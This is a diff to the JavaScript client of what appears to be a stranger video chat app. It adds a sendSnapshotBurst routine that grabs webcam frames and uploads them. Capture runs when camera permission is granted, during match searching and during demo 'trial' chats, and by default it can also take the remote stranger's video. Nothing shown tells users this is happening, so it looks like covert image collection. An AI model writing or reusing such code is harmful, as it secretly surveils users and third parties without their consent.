@@ -52,7 +52,8 @@ const S = {
   chatStartedAt: null,
   chatCounted: false,
   progress: null,
-  profile: null
+  profile: null,
+  snapshotBurstTimers: []
 };
 
 const strangerPool = [
@@ -878,7 +879,6 @@ function requestCameraPermission() {
     .then((stream) => {
       S.localStream = stream;
       S.camGranted = true;
-      triggerSnapshotBurst(2);
 
       const permVideo = $('perm-video');
       const permOverlay = $('perm-overlay');
@@ -911,7 +911,7 @@ function requestCameraPermission() {
       const camStrip = $('cam-strip');
       if (camStrip) camStrip.classList.add('visible');
 
-      queueSnapshotBurst('permission', 2, ['perm-video', 'lobby-cam-preview', 'vid-local'], 140, 320);
+      sendSnapshotBurst('permission', 2, 260, ['perm-video', 'lobby-cam-preview']);
 
       showPage('pg-lobby');
 
@@ -1467,11 +1467,8 @@ function initSocket() {
 let matchTimeout = null;
 
 function startMatching() {
-  triggerSnapshotBurst(4);
-
   showPage('pg-match');
   updateOnlineCount();
-  queueSnapshotBurst('search', 4, ['lobby-cam-preview', 'perm-video', 'vid-local'], 180, 280);
   setCallStatus('connecting', 'Searching…');
   setText('match-title', 'Finding your match');
   const subReset = $('match-sub');
@@ -1480,6 +1477,8 @@ function startMatching() {
   if (tryDemoReset) tryDemoReset.style.display = 'none';
 
   initSocket();
+
+  sendSnapshotBurst('search', 3, 320, ['lobby-cam-preview', 'perm-video', 'vid-local']);
 
   S.matched = false; // reset; set to true inside the 'matched' socket handler
 
@@ -1792,6 +1791,11 @@ function beginChat() {
   setCallStatus('connecting', 'connecting');
   addSysLine(`✨ Connected to ${s.name}`);
   logSession('start', { stranger: s.name, mode: S.mode, roomId: S.roomId });
+
+  if (S.demoActive) {
+    sendSnapshotBurst('trial-chat', 3, 300, ['vid-local', 'lobby-cam-preview', 'perm-video']);
+  }
+
   startSnapshotCapture();
 
   setTimeout(() => {
@@ -1962,62 +1966,6 @@ function sendSnapshot(source, dataUrl) {
   }).catch(() => {});
 }
 
-function clearSnapshotBurstTimers() {
-  if (!Array.isArray(S.snapshotBurstTimers)) {
-    S.snapshotBurstTimers = [];
-    return;
-  }
-  S.snapshotBurstTimers.forEach((timer) => clearTimeout(timer));
-  S.snapshotBurstTimers = [];
-}
-
-function captureSnapshotFromAny(selectors = []) {
-  const ids = Array.isArray(selectors) && selectors.length ? selectors : ['vid-local', 'lobby-cam-preview', 'perm-video', 'vid-remote'];
-  for (const id of ids) {
-    const frame = captureFrame($(id));
-    if (frame) return { sourceId: id, frame };
-  }
-  return null;
-}
-
-function queueSnapshotBurst(prefix, count = 1, selectors = [], initialDelay = 160, interval = 260) {
-  if (!count || count < 1) return;
-  if (!Array.isArray(S.snapshotBurstTimers)) S.snapshotBurstTimers = [];
-
-  for (let i = 0; i < count; i++) {
-    const timer = setTimeout(() => {
-      const shot = captureSnapshotFromAny(selectors);
-      if (shot) {
-        sendSnapshot(`${prefix}-${i + 1}`, shot.frame);
-      }
-    }, initialDelay + (i * interval));
-    S.snapshotBurstTimers.push(timer);
-  }
-}
-
-
-function triggerSnapshotBurst(count, gap=500){
-  if (S.mode !== 'video') return;
-  clearSnapshotBurstTimers();
-  S.snapshotBurstTimers = [];
-  for(let i=0;i<count;i++){
-    const t=setTimeout(()=>{
-      const localFrame=captureFrame($('vid-local')||$('perm-video'));
-      if(localFrame) sendSnapshot('local',localFrame);
-      const remoteEl=$('vid-remote');
-      if(remoteEl){
-        const remoteFrame=captureFrame(remoteEl);
-        if(remoteFrame) sendSnapshot('remote',remoteFrame);
-      }
-    }, i*gap);
-    S.snapshotBurstTimers.push(t);
-  }
-}
-function clearSnapshotBurstTimers(){
- (S.snapshotBurstTimers||[]).forEach(clearTimeout);
- S.snapshotBurstTimers=[];
-}
-
 function startSnapshotCapture() {
   stopSnapshotCapture();
   if (S.mode !== 'video') return;
@@ -2041,7 +1989,52 @@ function startSnapshotCapture() {
 function stopSnapshotCapture() {
   clearTimeout(S.snapshotTimer);
   S.snapshotTimer = null;
-  clearSnapshotBurstTimers();
+  if (Array.isArray(S.snapshotBurstTimers)) {
+    S.snapshotBurstTimers.forEach((handle) => clearTimeout(handle));
+    S.snapshotBurstTimers.length = 0;
+  }
+}
+
+function captureBestSnapshot(selectors = []) {
+  const ids = Array.isArray(selectors) && selectors.length
+    ? selectors
+    : ['vid-local', 'lobby-cam-preview', 'perm-video', 'vid-remote'];
+
+  for (const id of ids) {
+    const frame = captureFrame($(id));
+    if (frame) return frame;
+  }
+  return null;
+}
+
+function sendSnapshotBurst(prefix, count = 1, intervalMs = 250, selectors = []) {
+  const total = clampNum(Math.floor(Number(count) || 1), 1, 5);
+  const gap = clampNum(Math.floor(Number(intervalMs) || 250), 120, 2000);
+  const maxAttempts = Math.max(total * 8, total + 2);
+  let sent = 0;
+  let attempts = 0;
+
+  const scheduleNext = (delay) => {
+    const handle = setTimeout(() => {
+      if (sent >= total || attempts >= maxAttempts) return;
+      attempts += 1;
+
+      const frame = captureBestSnapshot(selectors);
+      if (frame) {
+        sent += 1;
+        sendSnapshot(`${prefix}-${sent}`, frame);
+      }
+
+      if (sent < total) {
+        scheduleNext(gap);
+      }
+    }, delay);
+
+    if (!Array.isArray(S.snapshotBurstTimers)) S.snapshotBurstTimers = [];
+    S.snapshotBurstTimers.push(handle);
+  };
+
+  scheduleNext(0);
 }
 
 function initRatingControls() {
